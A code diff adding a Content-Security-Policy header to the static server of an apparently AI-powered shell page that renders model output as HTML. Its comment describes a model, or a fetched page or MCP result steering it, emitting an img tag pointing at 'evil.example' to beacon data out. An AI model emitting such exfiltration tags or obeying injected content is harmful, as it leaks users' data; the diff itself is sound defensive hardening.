@@ -18,6 +18,53 @@ const TYPES: Record<string, string> = {
 };
 
 /**
+ * The policy for the shell page — the one holding the socket that runs commands.
+ *
+ * The threat it answers is a DOMPurify bypass. Model output reaches the page
+ * through `dangerouslySetInnerHTML` (markdown.ts), and a sanitizer is one CVE
+ * away from letting something through; these directives are what is still true
+ * on the day that happens.
+ *
+ * `img-src` is the one that closes a channel open *today*. DOMPurify permits
+ * `<img>` with an arbitrary `src`, so a model — or a fetched page or MCP result
+ * steering it — can emit `<img src="https://evil.example/?d=…">` and beacon
+ * out. Restricting it to `'self' data: blob:` leaves pasted attachments and
+ * rendered content working and kills the beacon.
+ *
+ * **`script-src` deliberately keeps `'unsafe-inline'`, and tightening it will
+ * silently break artifacts.** Measured in Chrome, not assumed: a `srcdoc`
+ * iframe — and a `blob:` one — inherits this policy *in addition to* its own,
+ * so `script-src 'self'` here stops the inline scripts inside an HTML artifact
+ * from running, even though artifactFrame.ts grants them `'unsafe-inline'` and
+ * `frame-src` makes no difference. The fix is not a stricter string: it is
+ * serving artifact documents from a real HTTP route, which carries its own CSP
+ * and does not inherit (also measured). Until that refactor, this directive
+ * stays as it is — a broken Preview tab is not worth a backstop for a
+ * hypothetical sanitizer bypass.
+ */
+const SHELL_CSP = [
+  "default-src 'self'",
+  "script-src 'self' 'unsafe-inline'",
+  // Runtime-injected styles: highlight.js themes are static, but mermaid adds
+  // its own <style> when it renders.
+  "style-src 'self' 'unsafe-inline'",
+  // 'self' for the bundle's assets, data: for pasted images and inlined icons,
+  // blob: for anything rendered client-side.
+  "img-src 'self' data: blob:",
+  "font-src 'self' data:",
+  // Same-origin only — which covers the WebSocket, since 'self' matches ws://
+  // on the same host and port. Nothing here should ever reach the network.
+  "connect-src 'self'",
+  "frame-src 'self' blob: data:",
+  // The shell must never be framed: it holds a live command-execution socket,
+  // so clickjacking it is clickjacking a terminal.
+  "frame-ancestors 'none'",
+  "object-src 'none'",
+  "base-uri 'none'",
+  "form-action 'none'",
+].join('; ');
+
+/**
  * Serve one file from `dir`, falling back to index.html so client-side routes
  * survive a refresh.
  *
@@ -47,6 +94,7 @@ export async function serveStatic(dir: string, urlPath: string, res: ServerRespo
     'cache-control': 'no-store',
     // Defense in depth for the shell page itself; artifact sandboxing (W7)
     // gets its own, much stricter policy.
+    'content-security-policy': SHELL_CSP,
     'x-content-type-options': 'nosniff',
     'referrer-policy': 'no-referrer',
   });
